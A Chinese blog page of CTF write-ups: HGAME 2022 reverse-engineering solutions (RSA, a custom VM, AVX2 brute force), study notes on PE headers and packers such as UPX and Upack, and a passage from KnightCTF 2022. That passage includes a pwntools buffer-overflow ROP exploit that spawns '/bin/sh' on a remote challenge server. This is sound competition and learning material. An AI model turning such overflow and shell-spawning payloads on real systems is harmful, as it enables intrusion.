class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        num ^= a[i]</span><br><span class="line">        a[i] = a[i] ^ num</span><br><span class="line">    <span class="keyword">try</span>:    <span class="comment"># 将无法转换的情况直接丢弃，说明该情况必然不是flag</span></span><br><span class="line">        enc = <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,a)))</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">	p = <span class="number">92582184765240663364795767694262273105045150785272129481762171937885924776597</span></span><br><span class="line">	q = <span class="number">107310528658039985708896636559112400334262005367649176746429531274300859498993</span></span><br><span class="line">	e = <span class="number">950501</span></span><br><span class="line">	r = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">	d = gmpy2.invert(e,r)</span><br><span class="line">	m = <span class="built_in">pow</span>(enc,d,p*q)</span><br><span class="line">	<span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<p><strong>运行得到flag：hgame{g0_and_g0_http_5erv3r_nb}</strong></p>
<h2 id="ezvm"><a href="#ezvm" class="headerlink" title="ezvm"></a>ezvm</h2><p>IDA：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/02/436acfa19cd9ef46.png" alt="main"></p>
<p>可以看出主函数输入后进入switch；</p>
<p>翻译出每个case对应操作，恢复程序逻辑：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">	VM_START</span><br><span class="line"></span><br><span class="line">	OP_PUSH_NUM | </span><br><span class="line">	OP_POP_EBX |&#x27;\n&#x27;</span><br><span class="line"></span><br><span class="line">	OP_PUSH_NUM | </span><br><span class="line">	OP_POP_ECX |-5</span><br><span class="line">.input:</span><br><span class="line">	OP_STREAM_IN |eax </span><br><span class="line">	OP_PUSH_EAX | </span><br><span class="line">	OP_ADD |edx,1 </span><br><span class="line">	OP_CMP |eax,ebx </span><br><span class="line">	OP_JNE |ecx .input</span><br><span class="line">	</span><br><span class="line">.check_len:</span><br><span class="line">	OP_SUB |edx,1 </span><br><span class="line">	OP_PUSH_NUM | </span><br><span class="line">	OP_POP_EBX |32</span><br><span class="line">	</span><br><span class="line">	OP_PUSH_NUM | </span><br><span class="line">	OP_POP_ECX |47</span><br><span class="line">	</span><br><span class="line">	OP_MOV |eax,edx </span><br><span class="line">	OP_PUSH_EAX </span><br><span class="line">	OP_CMP |eax,ebx </span><br><span class="line">	OP_JNE |ecx .exit</span><br><span class="line">	</span><br><span class="line">	OP_PUSH_NUM </span><br><span class="line">	OP_POP_ECX |-10</span><br><span class="line">	</span><br><span class="line">	OP_PUSH_NUM </span><br><span class="line">	OP_POP_EDX |0</span><br><span class="line">.enc:</span><br><span class="line">	OP_GET_MEM |eax,stack[edx]</span><br><span class="line">	OP_PUSH_NUM | </span><br><span class="line">	OP_POP_ESI |xor_key </span><br><span class="line">	OP_MUL |eax,2 </span><br><span class="line">	OP_XOR |eax,esi </span><br><span class="line">	OP_SET_MEM |stack[edx],eax </span><br><span class="line">	OP_ADD |edx,1 </span><br><span class="line">	OP_MOV |eax,edx </span><br><span class="line">	OP_CMP |eax,ebx</span><br><span class="line">	OP_JNE |ecx .enc</span><br><span class="line">	</span><br><span class="line">	OP_PUSH_NUM </span><br><span class="line">	OP_POP_EDX |0</span><br><span class="line">	</span><br><span class="line">	OP_PUSH_NUM |-17</span><br><span class="line">	</span><br><span class="line">	OP_PUSH_NUM |21</span><br><span class="line">.check</span><br><span class="line">	OP_PUSH_NUM | </span><br><span class="line">	OP_POP_EBX |cipher </span><br><span class="line">	OP_GET_MEM |eax,stack[edx] </span><br><span class="line">	OP_CMP |eax,ebx </span><br><span class="line">	OP_POP_EAX </span><br><span class="line">	OP_PUSH_EAX </span><br><span class="line">	OP_POP_ECX </span><br><span class="line">	OP_JNE |ecx .exit </span><br><span class="line">	OP_POP_ECX </span><br><span class="line">	OP_POP_EBX | </span><br><span class="line">	OP_PUSH_EBX | </span><br><span class="line">	OP_PUSH_ECX | </span><br><span class="line">	OP_PUSH_EAX </span><br><span class="line">	OP_ADD |edx,1 </span><br><span class="line">	OP_MOV |eax,edx </span><br><span class="line">	OP_CMP |eax,ebx </span><br><span class="line">	OP_JNE |ecx .check</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	OP_PUSH_NUM </span><br><span class="line">	OP_POP_ECX |2</span><br><span class="line">	</span><br><span class="line">	OP_PUSH_NUM | </span><br><span class="line">	OP_POP_EBX |0</span><br><span class="line">	</span><br><span class="line">	OP_PUSH_NUM </span><br><span class="line">	OP_POP_EDX |-6</span><br><span class="line">.success:</span><br><span class="line">	OP_PUSH_NUM | </span><br><span class="line">	OP_POP_EAX |str</span><br><span class="line">	</span><br><span class="line">	OP_CMP |eax,ebx </span><br><span class="line">	OP_JE |ecx .exit </span><br><span class="line">	OP_STREAM_OUT |eax </span><br><span class="line">	OP_JMP |edx .success</span><br><span class="line">	</span><br><span class="line">.exit:</span><br><span class="line">	VM_EXIT</span><br></pre></td></tr></table></figure>

<p>由此代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xor_keys = [<span class="number">94</span>, <span class="number">70</span>, <span class="number">97</span>, <span class="number">67</span>, <span class="number">14</span>, <span class="number">83</span>, <span class="number">73</span>, <span class="number">31</span>, <span class="number">81</span>, <span class="number">94</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">41</span>, <span class="number">65</span>, <span class="number">99</span>, <span class="number">59</span>, <span class="number">100</span>, <span class="number">59</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">91</span>, <span class="number">62</span>, <span class="number">34</span>, <span class="number">80</span>, <span class="number">70</span>, <span class="number">94</span>, <span class="number">53</span>, <span class="number">78</span>, <span class="number">67</span>, <span class="number">35</span>, <span class="number">96</span>, <span class="number">59</span>]</span><br><span class="line"></span><br><span class="line">plain_text = []</span><br><span class="line"></span><br><span class="line">cipher = [<span class="number">142</span>, <span class="number">136</span>, <span class="number">163</span>, <span class="number">153</span>, <span class="number">196</span>, <span class="number">165</span>, <span class="number">195</span>, <span class="number">221</span>, <span class="number">25</span>, <span class="number">236</span>, <span class="number">108</span>, <span class="number">155</span>, <span class="number">243</span>, <span class="number">27</span>, <span class="number">139</span>, <span class="number">91</span>, <span class="number">62</span>, <span class="number">155</span>, <span class="number">241</span>, <span class="number">134</span>, <span class="number">243</span>, <span class="number">244</span>, <span class="number">164</span>, <span class="number">248</span>, <span class="number">248</span>, <span class="number">152</span>, <span class="number">171</span>, <span class="number">134</span>, <span class="number">137</span>, <span class="number">97</span>, <span class="number">34</span>, <span class="number">193</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">32</span>): </span><br><span class="line">    plain_text.append(<span class="built_in">chr</span>((cipher[i]^xor_keys[i])//<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(plain_text))</span><br></pre></td></tr></table></figure>

<p><strong>运行可得flag：hgame{Ea$Y-Vm-t0-PrOTeCT_cOde!!}</strong></p>
<h2 id="hardasm"><a href="#hardasm" class="headerlink" title="hardasm"></a>hardasm</h2><p>IDA：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/02/b984af479404e23e.png" alt="main"></p>
<p>可以看到伪代码的main函数显示的也是__asm，汇编指令；</p>
<p>根据汇编指令可以搜索出，这是AVX2 指令集；</p>
<p>具体思路就是给 ymm1~ymm7 寄存器赋值，然后进行运算，ymm0是输入数据；</p>
<p>但运算过程过于庞大，而且不会这个指令集；又因为ymm0到比较与否的区域始终没有改变，所以可以爆破；</p>
<p>在比较数据的地方下个断点，调试的时候输入 hgame{aaaaaaaaaaaaaaaaaaaaaaaaa} 共32个字符串（因为scanf的格式为%32s），这时候可以发现：[rsp+70h+var_50] 的地方从原来的输入数据，变为了6个0xFF；</p>
<p><img src="https://i.bmp.ovh/imgs/2022/02/31f49302a7b6fc1e.png" alt="cmp"></p>
<p>这是因为比较后，因为前6个字符输入的都是正确的，而其他错误，所以其他的都成为了false，0；</p>
<p>那么就可以使用python的 subproccess 子程序模块，在运行脚本时对该程序进行操作，使其循环找到32个0xFF；</p>
<p>subprocess菜鸟教程：<a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/python3-subprocess.html">https://www.runoob.com/w3cnote/python3-subprocess.html</a></p>
<p>既然要找0xFF，那么需要从子程序中返回0xFF才行；</p>
<p>根据程序的输出可知：通过rcx将 error字符串或success字符串 打印出：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/02/4e2a2484b4766a94.png" alt="print"></p>
<p>那可以patch程序，将[rsp+70h+var_50]处的内容传递给rcx，以此打印；</p>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">real_flag=<span class="string">&quot;hgame&#123;&quot;</span>	<span class="comment">#绝对正确的前6个字符</span></span><br><span class="line">cur_index=<span class="number">6</span>	<span class="comment">#当前爆破的位置</span></span><br><span class="line"><span class="keyword">while</span> cur_index&lt;<span class="number">32</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):	<span class="comment">#当前爆破的位置上的字符</span></span><br><span class="line">        real_flag_arr = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(real_flag)):	<span class="comment">#正确的先复制一下</span></span><br><span class="line">            real_flag_arr[j]=<span class="built_in">ord</span>(real_flag[j])</span><br><span class="line">        real_flag_arr[<span class="built_in">len</span>(real_flag_arr)-<span class="number">1</span>]=<span class="built_in">ord</span>(<span class="string">&quot;&#125;&quot;</span>)	<span class="comment">#最后一个字符&quot;&#125;&quot;固定</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(real_flag_arr)-<span class="number">2</span>,cur_index,-<span class="number">1</span>):	<span class="comment">#除了当前爆破的位置，其他位置 上都设置为32(空格)</span></span><br><span class="line">            real_flag_arr[j]=<span class="number">32</span></span><br><span class="line"></span><br><span class="line">        real_flag_arr[cur_index]=i	<span class="comment">#设置当前爆破的位置上的字符</span></span><br><span class="line">        real_flag_arr_s=<span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> real_flag_arr)	<span class="comment">#输入到程序中的字符串</span></span><br><span class="line">        p = subprocess.Popen([<span class="string">&quot;C:\\Users\\Second_BC\\Desktop\\hardasm.exe&quot;</span>], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">        p.stdin.write(real_flag_arr_s.encode())</span><br><span class="line">        p.stdin.close()</span><br><span class="line">        out = p.stdout.read()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(out)&gt;cur_index:	<span class="comment">#判断程序打印出的0xFF的个数是否增加，增加则说明当前爆破的位置 上的字符设置的是正确的</span></span><br><span class="line">            real_flag+=<span class="built_in">chr</span>(i)</span><br><span class="line">            cur_index+=<span class="number">1</span> </span><br><span class="line">            <span class="built_in">print</span>(real_flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><strong>运行得flag：hgame{right_your_asm_is_good!!}</strong></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次hgame的逆向之旅收获了很多，应该可以说有了叫baby和easy题的题感；更多的包括JAVA的语法，z3的模型可运算，UPX的标签规则，POWERPC的PCC架构，Blowfish标准河豚算法，RSA大素数算法，DES加密的了解；有两道题并不是特别理解，一道是第三周的hardened，另一道就是第四周的ezvm了；前一道没有可用手机或是kali虚拟机，所以无从下手；另一道虚拟机因为还不太理解虚拟机的构造，所以无法翻译；</p>
<p>因此接下来的任务就是抽空把虚拟机的实验完成，以及ROOT手机到手；</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://secondbc.github.io/SecondBC/2022/02/22/Hgame2022-ReverseWriteUp/" data-id="ckzy4ql0v0000k4vcdvavae6v" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-逆向工程核心原理复现02" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/SecondBC/2022/02/19/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E5%A4%8D%E7%8E%B002/" class="article-date">
  <time datetime="2022-02-19T08:15:27.000Z" itemprop="datePublished">2022-02-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/SecondBC/2022/02/19/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E5%A4%8D%E7%8E%B002/">逆向工程核心原理复现02</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>这一章讲的是PE构造以及压缩加壳，因为之前看到过epf文件的构造，所以理解PE起来会容易很多，也可以去类比；</p>
<p>先总结一下PE文件的特点：有个头来控制各个节区的偏移，且在文件和内存中的形式相似却不一样；可以把内存中运行的程序成为文件的映像；</p>
<h2 id="第一：PE头"><a href="#第一：PE头" class="headerlink" title="第一：PE头"></a>第一：PE头</h2><p>PE头是个结构体，里面包含了更多的结构体，每个结构体有着调控和指向的作用；</p>
<ul>
<li><p><strong>DOS头</strong>，40个字节，名称 IMAGE_DOS_HEADER；里面的内容中，<strong>e_magic</strong> 代表签名，一般是4D5A；<strong>e_ifanew</strong> 代表NT头偏移量；</p>
</li>
<li><p>DOS头后有个<strong>DOS存根</strong>，PE文件可要可不要；</p>
</li>
<li><p><strong>NT头</strong>，包含三个成员，签名（<strong>signature</strong>），一般是PE00；以及文件头和可选头；</p>
<p><strong>文件头</strong>包含4个重要成员：<strong>Machine</strong> CPU唯一对应码；<strong>NumberOfSections</strong> 节区数量；<strong>SizeOfOptionalHeader</strong> 可选头大小；<strong>Characteristics</strong> 文件的信息情况；</p>
<p><strong>可选头</strong>的成员：<strong>Magic</strong> 可选头签名，32位是10B，64位是20B；<strong>AddressOfEntryPoint</strong> 俗称EP，显示的是EP的RVA值，这是程序执行的入口地址；<strong>ImageBase</strong> 文件的优先装入地址，exe和dll 在 0 ~ 7fffffff，sys在后面的内存中，其中，dll的起始值为 10000000；<strong>SectionAlignment FileAlignment</strong> 前者针对内存而言，后者针对磁盘而言，他们都是对齐，所以是节区的最小单位；<strong>SizeOfImage</strong> PE文件在内存中的空间大小；<strong>SizeOfHeader</strong> 整个PE头的大小；<strong>SubSystem</strong> 是否为sys后缀又或是exe和dll后缀；<strong>NumberOfRvaAndSizes</strong>  DataDirectory数组的下标数；<strong>DataDirectory</strong> 由IMAGE_DATA_DIRECTORY组成的数组；</p>
</li>
<li><p><strong>节区头</strong>，分三类，code（可执行，可读）；data（可写，可读）；resource（可读）；</p>
</li>
</ul>
<h2 id="第二：压缩和UPX"><a href="#第二：压缩和UPX" class="headerlink" title="第二：压缩和UPX"></a>第二：压缩和UPX</h2><p>这个部分讲述了内存和磁盘以及压缩如何处理文件的内容；</p>
<ul>
<li><p><strong>Rva to Raw</strong> 可以这么理解，raw就是生肉，还没烤熟，所以在磁盘中为文件，没有驱动；那么它的意思就是，从 内存 到 磁盘；具体是在说它们的偏移映射；</p>
<p>具体算法：<strong>Raw = Rva - VirtualAddress + PointerToRawData</strong>；</p>
</li>
<li><p><strong>INT</strong> 与 <strong>IAT</strong>，前者全称：import name table，后者全称：import address table，后者叫做 导入地址表；</p>
</li>
<li><p><strong>DLL</strong> 全称：动态链接库，一共两种方式，显式连接，隐式连接；前者是使用时链接，使用后释放，后者是启动时链接，结束后释放（类似于静态链接）；</p>
</li>
<li><p><strong>CreateFileW()</strong> 函数，因为不知道PE的实际版本，所以用（<strong>01001104</strong>）地址处的值来进行跳转；</p>
</li>
<li><p><strong>IMAGE_IMPORT_DESCRIPTOR</strong> 导入库；</p>
</li>
<li><p><strong>IMAGE_OPTIONAL_Header32.DataDirectory[1].VirtualAddress</strong> DataDirectory数组，这个值是导入库的起始地址；</p>
</li>
<li><p><strong>EAT</strong> 和 <strong>API</strong> 前者能求出相应库中导出函数的起始地址，后者通过<strong>GetProcAddress()</strong> 函数获取要取函数的地址；</p>
</li>
<li><p><strong>压缩即运行时压缩——UPX</strong>，因为解压通常会有解码循环，所以在逆向加壳产物的思想就是，尽量避免循环；</p>
<p>UPX的<strong>特征</strong>：EP码在 pushad 和 popad 之间；且跳转到OEP处的JUMP指令紧跟 popad 之后；</p>
<p><strong>硬件断点</strong>：由CPU支持，最多打4个，与普通断点的区别是：在断点处的指令完成之后暂停调试；</p>
</li>
</ul>
<h2 id="第三：重定位"><a href="#第三：重定位" class="headerlink" title="第三：重定位"></a>第三：重定位</h2><p>讲述PE文件链接后成为程序时，从文件到磁盘地址的变化内容；PE文件加入内存时，文件会被加载到 ImageBase 所指地址，若再加入DLL，那么加入的DLL会被重新定位；</p>
<p><strong>原理</strong>：</p>
<ul>
<li>在应用程序中查找硬编码地址位置；</li>
<li>用读值减去ImageBase（VA -&gt; RVA）；</li>
<li>加上实际加载地址（RVA -&gt; VA）；</li>
</ul>
<p>首先需要了解：<strong>基址重定位表</strong>（Relocation Table），这个表也在DataDirectory数组中，下标为5；</p>
<p>其中的重要成员：<strong>VirtualAddress</strong> 基准地址，RVA值，4字节，可以用来算 Rva To Raw；<strong>SizeOfBlock</strong> 重定位块大小，4字节；<strong>TypeOffset</strong> 偏移，由4位Type和12位offset组成，共2字节；</p>
<p>删除reloc节以理解整个PE的工作：整理节区头，删除节区，修改文件头和可选头；</p>
<ul>
<li><p>节区头从文件偏移270处开始，大小28个字节，节区起始位置偏移为C000；</p>
</li>
<li><p>文件头中的 NumberOfSections 改少1，因为删除了一个节区；</p>
</li>
<li><p>可选头中 SizeOfImage 减少，减少量：知晓reloc节中的VirtualSize值，并根据SectionAlignment扩展变化后的值；</p>
</li>
</ul>
<h2 id="第四：Upack压缩和内嵌补丁"><a href="#第四：Upack压缩和内嵌补丁" class="headerlink" title="第四：Upack压缩和内嵌补丁"></a>第四：Upack压缩和内嵌补丁</h2><p>Upack也是PE文件运行时的压缩器；但因为神奇的压缩技巧，会导致一些查看器认为文件损坏无法查看，所以需要特别地用Stud_PE来查看；</p>
<p><strong>压缩技巧</strong>：</p>
<ul>
<li><strong>重叠文件头</strong>，把PE头和MZ头重叠；</li>
<li><strong>修改文件头中 SizeOfOptionalHeader 的值</strong>，明面上改了可选头大小，实际上增大了可选头和节区头之间的距离，在空隙之间插入解码代码；</li>
<li><strong>修改可选头中 NumberOfRvaAndSizes 的值</strong>，增多DataDirectory数组，向文件头插入自身代码；</li>
<li><strong>修改节区头</strong>，Upack把自身代码记录到程序运行不需要的目录，不用特别增加节区；</li>
<li><strong>重叠节区</strong>；</li>
<li>Rva to Raw 时，<strong>使用异常处理</strong>：PointerToRawData应该遵循对齐，但Upack会改值，运行时强制将这个值改为对齐的整数倍，一般是0；</li>
<li><strong>导入表</strong>，看似结尾没有NULL结尾会出错，实际上映射到内存后，后面会有空区域自行补充0；</li>
<li><strong>导入地址表</strong>；</li>
</ul>
<p><strong>解码循环</strong>：Upack把压缩后的数据放到第二个节区，在运行解码循环解压到第一个节区；解压后设置IAT，用导入的两个API；之后一边循环一边构建原本的IAT，完成后连接到OEP；</p>
<p><strong>内嵌补丁</strong>：注入的代码，一般用于针对难以直接修改的代码的更新升级或者恶意篡改；需要对PE文件熟悉来更改PE的控制设定增添节区；</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>了解完PE和压缩部分的知识过后，也懂得了UPX的实际作用，以及如何逆向简单加壳程序；PE展示的成果其实远不止于此，正因为了解了PE构造和压缩，才能更好地藏匿木马节区和后门函数；现在学习地正是以前看不懂的电脑思维，以前就会思考为什么编译器能读懂高级语言呢？怎么编译成可执行文件呢？懂得了它的思维，就可以利用它的漏洞；实验还多，任重而道远，继续冲冲冲！</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://secondbc.github.io/SecondBC/2022/02/19/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E5%A4%8D%E7%8E%B002/" data-id="ckztkhuda00003svc8s723nfp" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Knight夺旗战" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/SecondBC/2022/01/26/Knight%E5%A4%BA%E6%97%97%E6%88%98/" class="article-date">
  <time datetime="2022-01-25T17:52:33.000Z" itemprop="datePublished">2022-01-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/SecondBC/2022/01/26/Knight%E5%A4%BA%E6%97%97%E6%88%98/">Knight夺旗战</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>由孟加拉国第一次举办的为期27小时的夺旗战；</p>
<p>KnightCTF做起来二进制方向确实算签到题；</p>
<p>同时KnightCTF偏小众，但是个很好的新手训练平台，能很好的入门各个方向；</p>
<p>但同时KnightCTF有很多个扩展方向，不只是局限于web，re，crypto，pwn，misc；</p>
<p>还有数字取证（Digital Forensics），开源情报（OSINT），隐写（Steganography），网络（Networking），以及编程（Programming）；</p>
<p>通过这些特殊的方向可以学习到很多有意思的知识；</p>
<p>比如隐写会把秘密写在图片里，或者图片的介绍里；网络会需要用到wireshark，由此还特别下载学习使用；开源情报则是灵活使用谷歌搜索以及其他的爬虫；</p>
<p>通过这次CTF的学习，可以发现很多奇怪的文件都可以转成zip来破解，有些甚至会套娃；</p>
<h2 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h2><p>我和我的小队成员也在比赛的过程中互相帮助，揣测思路；尽管二进制很简单，我们能很快解决AK掉，但其他方向和奇怪的谜题也困扰着我们，比如misc的3D建模需要穿模找flag…等等；</p>
<p>一边学习一边讨论一边解题，针对新知识，解题确实让人头大，连续熬夜两天，每天都高强度地盯着屏幕，怕是这样久了头发都掉光；</p>
<p>为什么这么认真呢？因为这是矩阵战队第一次的CTF比赛，我们会团结起来，去拿到一切能拿到的分数，不会说二进制AK我就下班；</p>
<p>在这过程中，我们还误判了结束比赛的时间，导致排名往下掉了不少，最后也是凭着每个人的意志熬了过来；</p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/b004b43013fc6e00.png" alt="Certificate"></p>
<p>最后也是成功的拿到了前100的名次得到证书；</p>
<p>虽然都不是什么难题，但确实让人开心；</p>
<p>接下来就是二进制系列的复现了；</p>
<h2 id="Pwn："><a href="#Pwn：" class="headerlink" title="Pwn："></a>Pwn：</h2><h3 id="whats-your-name"><a href="#whats-your-name" class="headerlink" title="whats_your_name"></a>whats_your_name</h3><p>IDA和ROPgadget：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/37486e2dbc72a52c.png" alt="main"></p>
<p>可以看到主函数很简单，gets输入v4会栈溢出，以便修改v5的值，执行system函数获取flag；</p>
<p>使用ROPgadget会发现有可以控制的寄存器，所以可以玩一点花的；</p>
<p>再使用cyclic命令找到溢出返回的长度；</p>
<p>用got表可以找到plt的偏移；</p>
<p>之前写过ret2libc，那就用那次的经历来写一次；</p>
<p>Exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;198.211.115.81&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">ad = <span class="number">0x404048</span></span><br><span class="line">system = <span class="number">0x401030</span></span><br><span class="line">r15 = <span class="number">0x401242</span></span><br><span class="line">gets = <span class="number">0x401050</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">68</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(gets) + p64(r15) + p64(ad) + p64(system) + <span class="string">b&#x27;e&#x27;</span>*<span class="number">8</span> +p64(ad)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>思路就是，直接去return，先调用gets函数，控制r15寄存器输入 ‘/bin/sh’ 到一段可修改的地址，返回后调用system，直接执行 system(‘/bin/sh’) ；</p>
<p><strong>之后得到flag：KCTF{bAbY_bUfF3r_0v3Rf1Ow}</strong></p>
<h3 id="hackers-vault"><a href="#hackers-vault" class="headerlink" title="hackers_vault"></a>hackers_vault</h3><p>IDA：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/34fc0241dcca91fb.png" alt="main"></p>
<p>可以发现输入的v4是用%d（整数）格式输入的，之后还有一个运算，最后得出v5的值，如果v5 = 48，就能拿到flag；</p>
<p>其实就是一道非常简单的逆向题；</p>
<p>算法就是每一位数的和，所以只需要输入一串数字，这串数字加起来为48就好了（千万别管溢出！别管int的位数！）</p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/8056e1b5cf33b67a.png" alt="answer"></p>
<p><strong>然后就nc到服务器，输入数字得到flag：KCTF{b1NaRy_3xOpL0iTaT1On_r0cK5}</strong></p>
<h3 id="whats-your-name-two"><a href="#whats-your-name-two" class="headerlink" title="whats_your_name_two"></a>whats_your_name_two</h3><p>IDA：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/486ae28d23246b16.png" alt="main"></p>
<p>查看主函数，发现输入的内容s，会被复制到dest，看栈的结构，可以知道dest后面紧跟v6和v7；</p>
<p>主函数里判断，如果v7和v6满足条件值，就执行system获取flag；</p>
<p>则Exp：</p>
